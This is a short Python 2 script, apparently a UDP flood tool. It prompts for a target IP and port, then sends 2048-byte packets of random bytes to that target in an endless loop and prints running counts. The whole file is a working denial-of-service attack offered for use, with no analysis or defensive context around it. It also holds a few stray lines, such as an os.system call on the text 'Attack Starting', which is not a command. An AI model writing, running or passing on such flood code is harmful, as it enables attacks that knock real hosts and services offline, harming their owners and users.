import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
#############

ip = raw_input("IP Target : ")
port = input("Port       : ")


os.system("clear")
os.system("Attack Starting")
print "[Game Start!]"

time.sleep(3)
sent = 0
times = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%s times:%s"%(sent,ip,port,times)

     if sent == 65534:
          times = times +1
          sent = 0